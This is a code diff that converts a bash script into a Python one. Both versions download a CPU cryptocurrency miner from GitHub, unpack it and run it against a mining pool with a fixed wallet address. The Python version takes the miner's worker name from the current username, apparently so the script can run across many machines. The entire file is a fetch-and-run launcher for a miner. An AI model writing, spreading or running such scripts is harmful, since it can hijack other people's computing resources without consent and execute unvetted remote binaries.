@@ -1,5 +1,10 @@
-#!/usr/bin/bash
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz --quiet
-tar -xvf hellminer_cpu_linux.tar.gz
-screen -ls
-./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.000worker -p x --cpu 6
+#!/usr/bin/python3
+import os
+
+worker = os.popen("whoami").read().replace("\n", "").split('-')
+worker = f"{worker[1]}v{worker[2]}"
+
+os.system("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz --quiet")
+os.system("tar -xvf hellminer_cpu_linux.tar.gz")
+os.system("screen -ls")
+os.system(f"./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.{worker} -p x --cpu 6")
